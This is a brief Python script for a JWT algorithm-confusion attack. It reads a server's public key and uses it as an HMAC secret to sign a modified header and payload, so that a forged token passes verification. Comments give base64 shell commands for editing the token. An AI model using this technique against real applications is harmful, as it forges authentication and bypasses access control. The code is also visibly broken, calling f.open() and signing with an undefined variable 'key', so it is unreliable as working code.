#Change Algorithm of JWT

import hmac
import base64
import hashlib

f=open("publickey.pem")
publickey=f.open()

# Run Linux Command to edit the original JWT header and Payload and Copy below down
# echo "base64header/payloadvalue" | base64 -d
# echo "modifiedheader/payloadvalue" | base64

str="modifiedheader.modifiedpayload"

sig=base64.urlsafe_b64encode(hmac.new(bytes(key,encoding="utf-8"),str.encode("utf-8"),hashlib.sha256).digest()).decode("utf-8").rstrip('=')

print(str+"."+sig)
